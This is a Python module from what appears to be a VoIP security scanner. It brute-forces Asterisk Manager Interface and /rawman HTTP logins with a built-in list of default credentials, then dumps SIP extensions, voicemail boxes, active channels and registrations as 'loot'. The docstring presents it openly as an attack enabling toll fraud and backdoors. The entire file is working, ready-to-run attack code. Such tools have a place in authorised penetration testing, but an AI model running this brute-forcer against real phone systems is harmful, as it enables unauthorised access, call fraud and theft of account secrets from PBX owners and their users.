"""Asterisk Manager Interface (AMI) attacks.

AMI is the privileged management protocol on Asterisk-based PBXes — FreePBX,
Grandstream UCM, and vanilla Asterisk all expose it on TCP/5038 by default.
If exposed to the internet AND vulnerable to default creds, AMI gives the
attacker the keys to the kingdom:

  - Dump every extension and its secret (Action: SIPpeers + SIPshowpeer)
  - Originate arbitrary calls (Action: Originate) — instant toll fraud
  - Reload dial plan (Action: Reload) — persist a backdoor
  - Read voicemail config + paths (Action: VoicemailUsersList)

This module brute-forces AMI logins with a small default-cred list, then
on success dumps extensions and voicemail boxes as findings.
"""
from __future__ import annotations

import socket
from dataclasses import dataclass, field


DEFAULT_AMI_CREDS: list[tuple[str, str]] = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "amp111"),       # FreePBX historical default
    ("admin", "asteriskadmin"),
    ("manager", "manager"),
    ("manager", "secret"),
    ("admin", "freepbx"),
    ("admin", "Asterisk2017!"),
    ("root", "root"),
    ("ami", "ami"),
    ("super", "secret"),
    ("", ""),                  # blank username/password (some installs have no auth)
    ("asterisk", "asterisk"),
    ("admin", ""),             # blank password admin
    ("pbxadmin", "pbxadmin"),
    ("freepbx", "freepbx"),
    ("user", "user"),
]


@dataclass
class AmiResult:
    host: str
    port: int
    reachable: bool
    success: bool = False
    username: str = ""
    password: str = ""
    evidence: str = ""
    # Loot dumped on success
    extensions: list[str] = field(default_factory=list)
    voicemail_boxes: list[str] = field(default_factory=list)
    active_channels: list[str] = field(default_factory=list)
    sip_registrations: list[str] = field(default_factory=list)


def try_login(host: str, username: str, password: str,
              port: int = 5038, timeout: float = 3.0) -> dict | None:
    """Public helper: attempt a single AMI login. Returns a dict with 'success'
    key (and 'username'/'password' on success), or None if the port is unreachable."""
    ok, banner, resp = _try_login(host, port, username, password, timeout)
    if not banner:
        return None
    return {"success": ok, "username": username, "password": password,
            "evidence": resp[:200] if ok else ""}


def _send(sock: socket.socket, data: str) -> str:
    """Send + read until --END COMMAND-- or a short period of silence."""
    sock.sendall(data.encode("utf-8"))
    buf = b""
    sock.settimeout(2.0)
    while True:
        try:
            chunk = sock.recv(8192)
        except socket.timeout:
            break
        if not chunk:
            break
        buf += chunk
        if b"\r\n\r\n" in buf and (b"Response:" in buf or b"Event:" in buf):
            # Most AMI replies end with a blank line. Read a tiny bit more
            # in case the PBX is still chunking output.
            sock.settimeout(0.3)
            try:
                while True:
                    extra = sock.recv(8192)
                    if not extra:
                        break
                    buf += extra
            except socket.timeout:
                pass
            break
    return buf.decode("utf-8", errors="replace")


def _try_login(host: str, port: int, username: str, password: str,
               timeout: float) -> tuple[bool, str, str]:
    """Return (logged_in, banner, response_text)."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        s.settimeout(timeout)
        banner = s.recv(2048).decode("utf-8", errors="replace")
        if "Asterisk Call Manager" not in banner:
            return False, banner, ""
        resp = _send(s,
            f"Action: Login\r\nUsername: {username}\r\nSecret: {password}\r\n"
            "Events: off\r\n\r\n"
        )
        if "Success" in resp:
            # Stay logged in; caller follows up with dump actions
            return True, banner, resp
        return False, banner, resp
    except (socket.timeout, OSError):
        return False, "", ""
    finally:
        try:
            s.close()
        except OSError:
            pass


def _rawman_try_login(host: str, port: int, username: str, password: str,
                      timeout: float) -> tuple[bool, bool]:
    """Return (reachable, authenticated) against Asterisk /rawman HTTP API."""
    import urllib.parse as _up
    qs = f"action=login&username={_up.quote(username)}&secret={_up.quote(password)}"
    path = f"/rawman?{qs}"
    req_bytes = (
        f"GET {path} HTTP/1.0\r\n"
        f"Host: {host}\r\n"
        "User-Agent: VoIPScan/3.0\r\n\r\n"
    ).encode()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        s.sendall(req_bytes)
        raw = b""
        while len(raw) < 4096:
            try:
                chunk = s.recv(2048)
            except socket.timeout:
                break
            if not chunk:
                break
            raw += chunk
        text = raw.decode("utf-8", errors="replace")
        reachable = bool(text)
        authed = "Response: Success" in text or "authenticated" in text.lower()
        return reachable, authed
    except (socket.timeout, OSError):
        return False, False
    finally:
        try:
            s.close()
        except OSError:
            pass


def attack_asterisk_http(
    host: str,
    port: int = 8088,
    cred_pairs: list[tuple[str, str]] | None = None,
    timeout: float = 3.0,
) -> AmiResult:
    """Brute-force Asterisk /rawman HTTP management API with default credentials."""
    creds = cred_pairs or DEFAULT_AMI_CREDS
    result = AmiResult(host=host, port=port, reachable=False)

    for u, p in creds:
        reachable, authed = _rawman_try_login(host, port, u, p, timeout)
        if reachable:
            result.reachable = True
        if authed:
            result.success = True
            result.username = u
            result.password = p
            result.evidence = f"Asterisk HTTP /rawman authenticated: {u}/{p}"
            return result

    if not result.reachable:
        result.evidence = "Asterisk HTTP API not reachable on this port"
    else:
        result.evidence = f"HTTP /rawman reachable but no default creds matched ({len(creds)} tried)"
    return result


def attack(
    host: str,
    port: int = 5038,
    cred_pairs: list[tuple[str, str]] | None = None,
    timeout: float = 3.0,
    traffic_log=None,
) -> AmiResult:
    """Try default AMI creds in sequence. On success, dump loot."""
    creds = cred_pairs or DEFAULT_AMI_CREDS
    result = AmiResult(host=host, port=port, reachable=False)

    for u, p in creds:
        ok, banner, resp = _try_login(host, port, u, p, timeout)
        if banner:
            result.reachable = True
        if not ok:
            continue

        # We're in. Reconnect with persistent session to dump loot.
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            s.connect((host, port))
            s.recv(2048)   # banner
            _send(s, f"Action: Login\r\nUsername: {u}\r\nSecret: {p}\r\n"
                     "Events: off\r\n\r\n")

            sip_peers = _send(s, "Action: SIPpeers\r\n\r\n")
            extensions = sorted({
                line.split(":", 1)[1].strip()
                for line in sip_peers.splitlines()
                if line.startswith("ObjectName:")
            })

            vm_list = _send(s, "Action: VoicemailUsersList\r\n\r\n")
            voicemail = sorted({
                line.split(":", 1)[1].strip()
                for line in vm_list.splitlines()
                if line.startswith("VoiceMailbox:")
            })

            channels = _send(s, "Action: CoreShowChannels\r\n\r\n")
            active = sorted({
                line.split(":", 1)[1].strip()
                for line in channels.splitlines()
                if line.startswith("Channel:")
            })

            registrations = _send(s, "Action: SIPshowregistry\r\n\r\n")
            registry = sorted({
                line.split(":", 1)[1].strip()
                for line in registrations.splitlines()
                if line.startswith("Username:") or line.startswith("Host:")
            })

            _send(s, "Action: Logoff\r\n\r\n")
            result.success = True
            result.username = u
            result.password = p
            result.evidence = "AMI login succeeded; dumped configuration"
            result.extensions = extensions
            result.voicemail_boxes = voicemail
            result.active_channels = active
            result.sip_registrations = registry
            return result
        except (socket.timeout, OSError) as exc:
            result.evidence = f"login OK but dump failed: {exc}"
            result.success = True
            result.username = u
            result.password = p
            return result
        finally:
            try:
                s.close()
            except OSError:
                pass

    if result.reachable:
        result.evidence = (f"AMI banner reached but no default creds matched "
                            f"({len(creds)} tried)")
    else:
        result.evidence = "AMI port not reachable"
    return result
